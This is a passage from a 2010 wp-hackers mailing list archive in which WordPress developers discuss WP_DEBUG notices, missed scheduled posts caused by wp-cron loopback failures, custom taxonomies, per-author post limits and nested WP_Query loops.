    0.3672   32740712   8. call_user_func_array() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:1067
    0.3672   32741096   9. WP_User->has_cap() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:0
    0.3673   32741416  10. _deprecated_argument() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:722
    0.3673   32741928  11. trigger_error() /Users/mikeschinkel/Sites/client/trunk/wp-includes/functions.php:3321


From mikeschinkel at newclarity.net  Tue Jul 20 02:06:38 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 19 Jul 2010 22:06:38 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>
	<AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>
	<AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com>
	<3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>
Message-ID: <5BCED63E-5467-4C06-AB8C-2933FB93EC64@newclarity.net>

Further, if you use  WP_DEBUG with a plain vanilla WP 3.0 site and activate Akismet you get this notice:
Notice: register_sidebar_widget is <strong>deprecated</strong> since version 2.8! Use wp_register_sidebar_widget() instead. in ~/wp-includes/functions.php on line 3237
Akismet. Shipped with WordPress core even.  Can you see why maybe WP_DEBUG is not (currently) a panacea?

-Mike

On Jul 19, 2010, at 9:33 PM, Mike Schinkel wrote:

> On Jul 19, 2010, at 3:02 PM, Andrew Nacin wrote:
>> On Mon, Jul 19, 2010 at 2:56 PM, Jeremy Clarke <jer at simianuprising.com>
>> wrote:
>> 
>>> If you don't want notices then you shouldn't be using WP_DEBUG.
>> 
>> But you should want notices. Just saying.
>> 
>> Speficially, running WP_DEBUG is pretty much mandatory for any core
>>> development
>> 
>> because all the core devs have it turned on
>> 
>> Also true.
>> 
>> Writing your own code to not generate notices is easy and good for business
>> in all kinds of ways. The process of declaring/checking your variables
>> before use leads you to avoid a lot of mysterious and rare bugs down the
>> line, and helps you clean up your code in the process.
> 
> Andrew & Jeremy,
> 
> I can't speak for Andrew Gray but I think one of the reasons he might be interested in just errors is because that many (most?) plugins were not developed with WP_DEBUG and spew lots of errors.  So while it may be a great idea to use WP_DEBUG when hacking on core or building a plugin in a vacuum, it is often impractical when working on plugins or themes on real world website implementations.  So in general I (am rarely in a position where I can) develop with it.
> 
> OTOH I'd really *prefer* to using WP_DEBUG but what is stopping me are the plugins the client wants or needs that were not coded with WP_DEBUG.  Part of the problem is that very few places recommend WP_DEBUG (I didn't even learn about it until a few months ago by reading someone else's off-hand remark on the hackers list) but more importantly there is no place in the WordPress.org repositories where a plugin or  theme can be lauded for their use of WP_DEBUG.  For the "3.org" refresh, Is there a way we can automatically verify which plugins actually do support WP_DEBUG and which do not?  That would go a huge way towards allowing us to actually use WP_DEBUG when developing for real world implementations
> 
> -Mike
> P.S. I tried it again and it seems that it even throughs errors in core code (or at least it seems that way.)  The following error came from my call to add_submenu_page() in an admin_menu hook:
> 
> Notice: has_cap was called with an argument that is <strong>deprecated</strong> since version 2.0! Usage of user levels by plugins and themes is deprecated. Use roles and capabilities instead. in /Users/mikeschinkel/Sites/client/trunk/wp-includes/functions.php on line 3321
> 
> Call Stack:
>    0.0007     740168   1. {main}() /Users/mikeschinkel/Sites/client/trunk/wp-admin/admin.php:0
>    0.3520   32696800   2. require('/Users/mikeschinkel/Sites/client/trunk/wp-admin/menu.php') /Users/mikeschinkel/Sites/client/trunk/wp-admin/admin.php:93
>    0.3663   32754208   3. do_action() /Users/mikeschinkel/Sites/client/trunk/wp-admin/menu.php:328
>    0.3671   32738840   4. call_user_func_array() /Users/mikeschinkel/Sites/client/trunk/wp-includes/plugin.php:395
>    0.3671   32738872   5. WP_InitializeSite::admin_menu() /Users/mikeschinkel/Sites/client/trunk/wp-includes/plugin.php:0
>    0.3671   32739264   6. add_submenu_page() /Users/mikeschinkel/Sites/client/trunk/wp-content/plugins/wp-initialize-site/wp-initialize-site.php:67
>    0.3672   32739840   7. current_user_can() /Users/mikeschinkel/Sites/client/trunk/wp-admin/includes/plugin.php:929
>    0.3672   32740712   8. call_user_func_array() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:1067
>    0.3672   32741096   9. WP_User->has_cap() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:0
>    0.3673   32741416  10. _deprecated_argument() /Users/mikeschinkel/Sites/client/trunk/wp-includes/capabilities.php:722
>    0.3673   32741928  11. trigger_error() /Users/mikeschinkel/Sites/client/trunk/wp-includes/functions.php:3321
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at andrewnacin.com  Tue Jul 20 04:11:33 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 00:11:33 -0400
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com> 
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com> 
	<AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com> 
	<AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com> 
	<3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>
Message-ID: <AANLkTim-XzTyPH25xqsIjQZ5y-mtaZOPH2nat3QG5bbT@mail.gmail.com>

On Mon, Jul 19, 2010 at 9:33 PM, Mike Schinkel <mikeschinkel at newclarity.net>
wrote:

> P.S. I tried it again and it seems that it even throughs errors in core
> code (or at least it seems that way.)  The following error came from my call
> to add_submenu_page() in an admin_menu hook:



Notice: has_cap was called with an argument that is
> <strong>deprecated</strong> since version 2.0! Usage of user levels by
> plugins and themes is deprecated. Use roles and capabilities instead. in
> /Users/mikeschinkel/Sites/client/trunk/wp-includes/functions.php on line
> 3321


You're calling add_submenu_page() and passing a user level (i.e. number)
instead of a capability (i.e. edit_theme_options).

I'm not referring to deprecated functionality. For that, I would strongly
(and shamelessly) recommend my own plugin to suppress and log those:
http://wordpress.org/extend/plugins/log-deprecated-notices/.

I'm referring to generic PHP notices like unchecked indexes and undefined
variables. If your plugin or theme gushes these out, it is nearly always
indicative of poorly written code.

You are correct that if you have numerous plugins written by others running
in a staging environment, you probably have your hands full. I did assume
Andrew was probably referring to this situation, but I never hesitate at the
chance to emphasize WP_DEBUG usage. :-)

Final note, I would love to have a checkbox where the plugin developer can
say, "Tested on WP_DEBUG."

From angelia at 10sexyapples.com  Tue Jul 20 04:53:59 2010
From: angelia at 10sexyapples.com (Angelia Baladon)
Date: Mon, 19 Jul 2010 21:53:59 -0700
Subject: [wp-hackers] Global call to all object types
Message-ID: <AANLkTimGruBZvEvULIIWQhOakEtyBEVEsdwQob9xpb3_@mail.gmail.com>

Hello all,
I'm still searching for how to create a checkbox within a form that will
allow a user to select "link" as the object type when registering a custom
taxonomy.

I was initially trying to figure out if there was any way to make a call to
"all object types", but, doesn't look like anybody had anything for me on
that~

Any help would be greatly appreciated~

From mikeschinkel at newclarity.net  Tue Jul 20 05:11:05 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 20 Jul 2010 00:11:05 -0500 (CDT)
Subject: [wp-hackers] DEBUG config and blocking notices
In-Reply-To: <AANLkTim-XzTyPH25xqsIjQZ5y-mtaZOPH2nat3QG5bbT@mail.gmail.com>
References: <A1EA5ACC-A3A1-41DD-B6F9-F7C18A8FE37C@graymerica.com>
	<AANLkTil17PpL3pdd-xERHTL9hUoGpk1dOUUYwyetz7KH@mail.gmail.com>
	<AANLkTilvzyXDAF9bl1iYXyAyyIaWbgZL2dDAgswwD2DW@mail.gmail.com>
	<AANLkTilbDRsv2VkQ4qzLvV2si5vjxpqXO-C1933w8in8@mail.gmail.com>
	<3EAEEC24-1D9D-430D-A0E1-893254637B38@newclarity.net>
	<AANLkTim-XzTyPH25xqsIjQZ5y-mtaZOPH2nat3QG5bbT@mail.gmail.com>
Message-ID: <878DBDEC-51AD-4534-8E9F-5F530F2A397A@newclarity.net>

> Final note, I would love to have a checkbox where the plugin developer can
> say, "Tested on WP_DEBUG."

Let's do it then!

-Mike

From Gavin.Pearce at 3seven9.com  Tue Jul 20 09:37:31 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 20 Jul 2010 10:37:31 +0100
Subject: [wp-hackers] Missed schedule - WP Bug
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>

Hi guys,

 

Have any of you ever seen this:

 

On the WordPress edit post page, where it lists all pages on the site
(/wp-admin/edit.php), on the right hand side just below the date for
each post, I have the message: 

Missed schedule

 

The date is set in the past (2010/06/30). However the post doesn't show
live.

 

A quick Google confirms it as a bug in WordPress:

http://wordpress.org/support/topic/343080

 

Anyone ever fix this?

 

Ta,

Gav

 


From wp at andrewnacin.com  Tue Jul 20 09:38:21 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 05:38:21 -0400
Subject: [wp-hackers] Global call to all object types
In-Reply-To: <AANLkTimGruBZvEvULIIWQhOakEtyBEVEsdwQob9xpb3_@mail.gmail.com>
References: <AANLkTimGruBZvEvULIIWQhOakEtyBEVEsdwQob9xpb3_@mail.gmail.com>
Message-ID: <AANLkTikMEXMkhUZ6jCmDhgoLwYxmfCVdax_aF4hw1GyF@mail.gmail.com>

On Tue, Jul 20, 2010 at 12:53 AM, Angelia Baladon
<angelia at 10sexyapples.com>wrote:

> Hello all,
> I'm still searching for how to create a checkbox within a form that will
> allow a user to select "link" as the object type when registering a custom
> taxonomy.
>
> I was initially trying to figure out if there was any way to make a call to
> "all object types", but, doesn't look like anybody had anything for me on
> that~
>
> Any help would be greatly appreciated~


You could merge get_post_types() with array('link'). Not sure there's a
better way to pull that one off.

I would not at all be surprised for links to become custom post types in the
near future.

From mccormicky at gmail.com  Tue Jul 20 09:42:09 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 20 Jul 2010 05:42:09 -0400
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
Message-ID: <AANLkTiktTNroICe7ETnZ8owXOO7uvut4S15ze1JTIKdC@mail.gmail.com>

I can't tell you how to fix it but I use this
http://byrev.org/uncategorized/missed-schedul.ess-plugin-fix/
to do updates when I'm on vacation and it worked really well. You might take
a look at the plugin files to see how it is addressing the issue.

On Tue, Jul 20, 2010 at 5:37 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Hi guys,
>
>
>
> Have any of you ever seen this:
>
>
>
> On the WordPress edit post page, where it lists all pages on the site
> (/wp-admin/edit.php), on the right hand side just below the date for
> each post, I have the message:
>
> Missed schedule
>
>
>
> The date is set in the past (2010/06/30). However the post doesn't show
> live.
>
>
>
> A quick Google confirms it as a bug in WordPress:
>
> http://wordpress.org/support/topic/343080
>
>
>
> Anyone ever fix this?
>
>
>
> Ta,
>
> Gav
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Tue Jul 20 09:43:49 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 05:43:49 -0400
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com>

On Tue, Jul 20, 2010 at 5:37 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> On the WordPress edit post page, where it lists all pages on the site
> (/wp-admin/edit.php), on the right hand side just below the date for
> each post, I have the message:
>
> Missed schedule
>
> ...
>
> A quick Google confirms it as a bug in WordPress:
>
> http://wordpress.org/support/topic/343080
>
> Anyone ever fix this?
>

Nah, scheduled posting has been broken for a few years. You're the first to
notice. ;-)

Here's the issue in a nutshell -- It's always a server issue. The WP cron
fires on a non-blocking HTTP request to itself, and if that doesn't work,
then your cron will never fire. I think a plugin like Core Control has the
tools to diagnose the issue for your server.

In 2.9.0, a late change to the curl implementation in the HTTP API ended up
breaking a good number of server setups. That was fixed in 2.9.1.

From Gavin.Pearce at 3seven9.com  Tue Jul 20 09:58:12 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 20 Jul 2010 10:58:12 +0100
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
	<AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local>

Cheers Andrew - always last to join the party.  ;)

I did think about server config - but got thrown off that scent as other
blogs on the same server, with the same setup, work without issue.

Any idea what the obvious server issues were? We've got a pretty solid
Red Hat install, but obviously will take a look.

G


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew
Nacin
Sent: 20 July 2010 10:44
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Missed schedule - WP Bug

On Tue, Jul 20, 2010 at 5:37 AM, Gavin Pearce
<Gavin.Pearce at 3seven9.com>wrote:

> On the WordPress edit post page, where it lists all pages on the site
> (/wp-admin/edit.php), on the right hand side just below the date for
> each post, I have the message:
>
> Missed schedule
>
> ...
>
> A quick Google confirms it as a bug in WordPress:
>
> http://wordpress.org/support/topic/343080
>
> Anyone ever fix this?
>

Nah, scheduled posting has been broken for a few years. You're the first
to
notice. ;-)

Here's the issue in a nutshell -- It's always a server issue. The WP
cron
fires on a non-blocking HTTP request to itself, and if that doesn't
work,
then your cron will never fire. I think a plugin like Core Control has
the
tools to diagnose the issue for your server.

In 2.9.0, a late change to the curl implementation in the HTTP API ended
up
breaking a good number of server setups. That was fixed in 2.9.1.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mccormicky at gmail.com  Tue Jul 20 10:14:45 2010
From: mccormicky at gmail.com (mccormicky)
Date: Tue, 20 Jul 2010 06:14:45 -0400
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
	<AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local>
Message-ID: <AANLkTimovCMcItDfdSoAQllEUflRtW56fnPW4EXRJmiC@mail.gmail.com>

The install I maintain presenting the missed schedule bug has a hefty
htaccess.
Do you have anything different in this one than in your other installs on
the same server that don't throw the bug
worth a look. Using the post dating option was not on my radar until this
summer so I was also unaware that a bug existed.




On Tue, Jul 20, 2010 at 5:58 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Cheers Andrew - always last to join the party.  ;)
>
> I did think about server config - but got thrown off that scent as other
> blogs on the same server, with the same setup, work without issue.
>
> Any idea what the obvious server issues were? We've got a pretty solid
> Red Hat install, but obviously will take a look.
>
> G
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew
> Nacin
> Sent: 20 July 2010 10:44
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Missed schedule - WP Bug
>
> On Tue, Jul 20, 2010 at 5:37 AM, Gavin Pearce
> <Gavin.Pearce at 3seven9.com>wrote:
>
> > On the WordPress edit post page, where it lists all pages on the site
> > (/wp-admin/edit.php), on the right hand side just below the date for
> > each post, I have the message:
> >
> > Missed schedule
> >
> > ...
> >
> > A quick Google confirms it as a bug in WordPress:
> >
> > http://wordpress.org/support/topic/343080
> >
> > Anyone ever fix this?
> >
>
> Nah, scheduled posting has been broken for a few years. You're the first
> to
> notice. ;-)
>
> Here's the issue in a nutshell -- It's always a server issue. The WP
> cron
> fires on a non-blocking HTTP request to itself, and if that doesn't
> work,
> then your cron will never fire. I think a plugin like Core Control has
> the
> tools to diagnose the issue for your server.
>
> In 2.9.0, a late change to the curl implementation in the HTTP API ended
> up
> breaking a good number of server setups. That was fixed in 2.9.1.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Tue Jul 20 10:58:56 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 20 Jul 2010 20:58:56 +1000
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local>
	<AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local>
Message-ID: <op.vf414hqfspxmuu@ho.st>

On Tue, 20 Jul 2010 19:58:12 +1000, Gavin Pearce  
<Gavin.Pearce at 3seven9.com> wrote:

> Cheers Andrew - always last to join the party.  ;)
>
> I did think about server config - but got thrown off that scent as other
> blogs on the same server, with the same setup, work without issue.
>
> Any idea what the obvious server issues were? We've got a pretty solid
> Red Hat install, but obviously will take a look.
>
> G

The main items would be
  * The Domain not resolving to / not being accessable via loopback, ie.  
The IP of mysite.com is a load-balancer in front of the server which  
doesnt accept requests from a local subnet
  * The Server has no DNS resolving abilities
  * The Server doesnt allow ANY outgoing (even loopback) connections
  * WordPress choosing a HTTP Transport which is incompatible with the  
local server for whatever reason ( Sometimes outgoing connections are  
fine, but loopback connections suffer from various bugs
  * .htaccess not making an exception for wp-cron.php calls (Ie. routing  
all .php files to another location.. or similar .htaccess rules)
  * .htaccess related security-blocking rules, might be blocking the  
WordPress self-request based on 'not really a browser client' look to it..

The list goes on, Best to check in the order:
  * Can the server make outgoing requests ( Core Control, my plugin, has a  
HTTP Access page, make sure the selected transport passes the Test  
function there )
  * Can the server make local requests  ( Really should add a "Local  
connection test" function to the above plugin... )
  * Is the Cron request showing in the HTTP Logs? Are there any error codes  
present? If so, are there any mention of it in a mod_security or related  
log files
  * If the Cron request is succeeding, Does it occur with all plugins  
disabled (Make a new install on the same server, see if it can future  
publish posts - Its a possibility that a plugin may be affecting the  
publishing ability and not being aware of it)

I cant think of much more I'd try right now, But there's a start

Cheers
Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From otto at ottodestruct.com  Tue Jul 20 11:44:43 2010
From: otto at ottodestruct.com (Otto)
Date: Tue, 20 Jul 2010 06:44:43 -0500
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <op.vf414hqfspxmuu@ho.st>
References: <CD47955B7E065D48AB5CF226C2ED75C02E30F1@tbs-sbs01.TBS.local> 
	<AANLkTinIgm8_g2R3JQVbfVQV90q0B3HObqVTz4XVzMmI@mail.gmail.com> 
	<CD47955B7E065D48AB5CF226C2ED75C02E30F2@tbs-sbs01.TBS.local> 
	<op.vf414hqfspxmuu@ho.st>
Message-ID: <AANLkTimnB0fveFG6U6hFnNTHHTKGlzzNc3VMXiinU5AR@mail.gmail.com>

And if all else fails:

define('ALTERNATE_WP_CRON',true);

This should be considered a last resort.

-Otto



On Tue, Jul 20, 2010 at 5:58 AM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> On Tue, 20 Jul 2010 19:58:12 +1000, Gavin Pearce <Gavin.Pearce at 3seven9.com>
> wrote:
>
>> Cheers Andrew - always last to join the party. ?;)
>>
>> I did think about server config - but got thrown off that scent as other
>> blogs on the same server, with the same setup, work without issue.
>>
>> Any idea what the obvious server issues were? We've got a pretty solid
>> Red Hat install, but obviously will take a look.
>>
>> G
>
> The main items would be
> ?* The Domain not resolving to / not being accessable via loopback, ie. The
> IP of mysite.com is a load-balancer in front of the server which doesnt
> accept requests from a local subnet
> ?* The Server has no DNS resolving abilities
> ?* The Server doesnt allow ANY outgoing (even loopback) connections
> ?* WordPress choosing a HTTP Transport which is incompatible with the local
> server for whatever reason ( Sometimes outgoing connections are fine, but
> loopback connections suffer from various bugs
> ?* .htaccess not making an exception for wp-cron.php calls (Ie. routing all
> .php files to another location.. or similar .htaccess rules)
> ?* .htaccess related security-blocking rules, might be blocking the
> WordPress self-request based on 'not really a browser client' look to it..
>
> The list goes on, Best to check in the order:
> ?* Can the server make outgoing requests ( Core Control, my plugin, has a
> HTTP Access page, make sure the selected transport passes the Test function
> there )
> ?* Can the server make local requests ?( Really should add a "Local
> connection test" function to the above plugin... )
> ?* Is the Cron request showing in the HTTP Logs? Are there any error codes
> present? If so, are there any mention of it in a mod_security or related log
> files
> ?* If the Cron request is succeeding, Does it occur with all plugins
> disabled (Make a new install on the same server, see if it can future
> publish posts - Its a possibility that a plugin may be affecting the
> publishing ability and not being aware of it)
>
> I cant think of much more I'd try right now, But there's a start
>
> Cheers
> Dion Hulse / dd32
>
> Contact:
> ?e: contact at dd32.id.au
> ?Web: http://dd32.id.au/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Tue Jul 20 12:26:53 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Tue, 20 Jul 2010 07:26:53 -0500
Subject: [wp-hackers] Limit number of post_type published by user
In-Reply-To: <AANLkTimUOMVs3AuHgoAjwev3wLMIPmVy__UvqP3WfUZc@mail.gmail.com>
References: <AANLkTimUOMVs3AuHgoAjwev3wLMIPmVy__UvqP3WfUZc@mail.gmail.com>
Message-ID: <A2B2FBC5-8CA6-4D94-ADAA-C1DB2109B0B4@striderweb.com>

In terms of interface, I would try to find a way to stop them *before* they type up the new Listing.  In other words, say "No" when they try to go to the "New Listing" page, rather than when they try to Save it.

(Though you should block at the save point to just to be sure....)

The workaround you suggested actually doesn't seem like a bad idea.

Stephen

On Jul 19, 2010, at 10:08 AM, Joaquin Rodriguez Montero wrote:

> I'm driving mad finding out how could I achieve this. Say I have a custom
> post_type "Listings" and I want each registered author to be allowed to
> publish just 1 entry of this type, is that possible?
> 
> A work around (just thought about it before sending this email) will be to
> create a new entry "Listing" automatically for every new author and allow
> him to edit that one (as it'll be assigned to him that shouldn't be a
> problem) and won't allow him to publish a new one.. but it's tricky..


From jayminkapish at inbox.com  Tue Jul 20 13:45:09 2010
From: jayminkapish at inbox.com (JAYMIN PATEL)
Date: Tue, 20 Jul 2010 05:45:09 -0800
Subject: [wp-hackers] Missed schedule - WP Bug
In-Reply-To: <AANLkTimnB0fveFG6U6hFnNTHHTKGlzzNc3VMXiinU5AR@mail.gmail.com>
References: <op.vf414hqfspxmuu@ho.st>
	<cd47955b7e065d48ab5cf226c2ed75c02e30f1@tbs-sbs01.tbs.local>
	<aanlktinigm8_g2r3jqvbfvqv90q0b3hobqvtz4xvzmmi@mail.gmail.com>
	<cd47955b7e065d48ab5cf226c2ed75c02e30f2@tbs-sbs01.tbs.local>
Message-ID: <5E5D90C02DA.0000063Bjayminkapish@inbox.com>


We had similar problem on MU install and we found DATE on a few front end servers was off by 5 mins. worth checking..

> -----Original Message-----
> From: otto at ottodestruct.com
> Sent: Tue, 20 Jul 2010 06:44:43 -0500
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Missed schedule - WP Bug
> 
> And if all else fails:
> 
> define('ALTERNATE_WP_CRON',true);
> 
> This should be considered a last resort.
> 
> -Otto
> 
> 
> 
> On Tue, Jul 20, 2010 at 5:58 AM, Dion Hulse (dd32) <wordpress at dd32.id.au>
> wrote:
>> On Tue, 20 Jul 2010 19:58:12 +1000, Gavin Pearce
>> <Gavin.Pearce at 3seven9.com>
>> wrote:
>> 
>>> Cheers Andrew - always last to join the party. ?;)
>>> 
>>> I did think about server config - but got thrown off that scent as
>>> other
>>> blogs on the same server, with the same setup, work without issue.
>>> 
>>> Any idea what the obvious server issues were? We've got a pretty solid
>>> Red Hat install, but obviously will take a look.
>>> 
>>> G
>> 
>> The main items would be
>> ?* The Domain not resolving to / not being accessable via loopback, ie.
>> The
>> IP of mysite.com is a load-balancer in front of the server which doesnt
>> accept requests from a local subnet
>> ?* The Server has no DNS resolving abilities
>> ?* The Server doesnt allow ANY outgoing (even loopback) connections
>> ?* WordPress choosing a HTTP Transport which is incompatible with the
>> local
>> server for whatever reason ( Sometimes outgoing connections are fine,
>> but
>> loopback connections suffer from various bugs
>> ?* .htaccess not making an exception for wp-cron.php calls (Ie. routing
>> all
>> .php files to another location.. or similar .htaccess rules)
>> ?* .htaccess related security-blocking rules, might be blocking the
>> WordPress self-request based on 'not really a browser client' look to
>> it..
>> 
>> The list goes on, Best to check in the order:
>> ?* Can the server make outgoing requests ( Core Control, my plugin, has
>> a
>> HTTP Access page, make sure the selected transport passes the Test
>> function
>> there )
>> ?* Can the server make local requests ?( Really should add a "Local
>> connection test" function to the above plugin... )
>> ?* Is the Cron request showing in the HTTP Logs? Are there any error
>> codes
>> present? If so, are there any mention of it in a mod_security or related
>> log
>> files
>> ?* If the Cron request is succeeding, Does it occur with all plugins
>> disabled (Make a new install on the same server, see if it can future
>> publish posts - Its a possibility that a plugin may be affecting the
>> publishing ability and not being aware of it)
>> 
>> I cant think of much more I'd try right now, But there's a start
>> 
>> Cheers
>> Dion Hulse / dd32
>> 
>> Contact:
>> ?e: contact at dd32.id.au
>> ?Web: http://dd32.id.au/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

____________________________________________________________
Publish your photos in seconds for FREE
TRY IM TOOLPACK at http://www.imtoolpack.com/default.aspx?rc=if4

From devin at tayloegray.com  Tue Jul 20 19:46:59 2010
From: devin at tayloegray.com (Devin Dixon)
Date: Tue, 20 Jul 2010 15:46:59 -0400
Subject: [wp-hackers] Loop Within A Loop
Message-ID: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>

Hey everyone,
I am having a problem where I need to call a loop within a loop.The
code looks somethign like this

?if ( have_posts() ) while ( have_posts() ) : the_post();

?? ? ??while ( $loop->have_posts() ) : $loop->the_post();

?? ? ? ? ??$wp_query= new WP_Query( array( 'post_type' =>
"$post_type", 'posts_per_page' => $post_per_page , 'post_parent' =>
 ? ? ? ? ? ? ? ?$parent_post , 'author' => "$author" ) );

?while ($wp_query->have_posts()) : $wp_query->the_post();

?>

<a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent
Link to <?php the_title_attribute(); ?>"><?php ? ? ? ?the_title();
?></a>

<?php

? ?? ??endwhile;

?? ? ? ?endwhile;

endif;

The problem is, the class WP_QUERY automatically makes everything
global. Is there a way where I can call the WP_QUERY object and
retrieve it values without it affecting the other loop?

From wp at andrewnacin.com  Tue Jul 20 19:52:34 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 15:52:34 -0400
Subject: [wp-hackers] Loop Within A Loop
In-Reply-To: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
References: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
Message-ID: <AANLkTimrwv4jDyUwn7Zl60BXb7vpnsbWxE4xKVa-3TJg@mail.gmail.com>

On Tue, Jul 20, 2010 at 3:46 PM, Devin Dixon <devin at tayloegray.com> wrote:

> Hey everyone,
> I am having a problem where I need to call a loop within a loop.The
> code looks somethign like this
>
>  if ( have_posts() ) while ( have_posts() ) : the_post();
>
>        while ( $loop->have_posts() ) : $loop->the_post();
>
>            $wp_query= new WP_Query( array( 'post_type' =>
> "$post_type", 'posts_per_page' => $post_per_page , 'post_parent' =>
>                 $parent_post , 'author' => "$author" ) );
>
>  while ($wp_query->have_posts()) : $wp_query->the_post();
>
> ?>
>
> <a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent
> Link to <?php the_title_attribute(); ?>"><?php        the_title();
> ?></a>
>
> <?php
>
>        endwhile;
>
>         endwhile;
>
> endif;
>
> The problem is, the class WP_QUERY automatically makes everything
